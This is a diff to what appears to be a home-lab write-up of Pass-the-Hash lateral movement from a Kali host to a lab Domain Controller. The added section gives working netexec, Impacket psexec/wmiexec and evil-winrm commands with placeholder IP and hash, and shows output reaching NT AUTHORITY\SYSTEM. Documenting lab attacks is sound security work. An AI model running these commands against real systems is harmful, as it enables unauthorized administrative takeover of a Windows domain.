@@ -22,6 +22,46 @@ Pass-the-Hash authentication (MITRE ATT&CK T1550.002 — Use Alternate Authentic
 - Network connectivity from the Kali attacker platform to the Domain Controller (SMB/RPC accessible).
 - No requirement for NTLM authentication to be restricted or disabled on the target for this technique to succeed.
 
+## Attack Execution
+
+### Step 1 — Validate the Hash (Kali)
+
+Before attempting a full interactive shell, the hash was validated against the Domain Controller using NetExec:
+
+```bash
+netexec smb [INSERT DC IP] -u Administrator -H [INSERT NT HASH] -d LAB
+```
+
+```
+SMB   [DC IP]   445   WIN-DC   [+] LAB\Administrator [Pwn3d!]
+```
+
+The `[Pwn3d!]` tag confirms administrative-level access was achieved using the hash alone.
+
+### Step 2 — Obtain an Interactive Shell (Kali, Impacket)
+
+```bash
+psexec.py -hashes :[INSERT NT HASH] LAB/Administrator@[INSERT DC IP]
+```
+
+```
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+### Step 3 — Alternative Execution Methods (documented for completeness)
+
+```bash
+# Quieter execution, no service creation
+wmiexec.py -hashes :[INSERT NT HASH] LAB/Administrator@[INSERT DC IP]
+
+# WinRM-based access, if enabled on target
+evil-winrm -i [INSERT DC IP] -u Administrator -H [INSERT NT HASH]
+
+# Direct one-off command execution
+netexec smb [INSERT DC IP] -u Administrator -H [INSERT NT HASH] -x "whoami"
+```
+
 ## Result
 
 The recovered NTLM hash was first validated using a lightweight authenticated SMB check, confirming administrative-level access to the Domain Controller. A full interactive remote command session was then established on the Domain Controller using the same hash, confirmed to be running as `NT AUTHORITY\SYSTEM`.
@@ -29,10 +69,10 @@ The recovered NTLM hash was first validated using a lightweight authenticated SM
 This stage is distinguished clearly from the previous stage: Credential Access **obtained** the credential material; Lateral Movement **used** that material to authenticate to, and gain command execution on, a separate, higher-value system (the Domain Controller).
 
 ## Evidence
+
 [`evidence/confirm-auth.png`](../evidence/confirm-auth.png)
 
 [`evidence/lateral-movement.png`](../evidence/lateral-movement.png)
-
 
 ## Security Impact
 
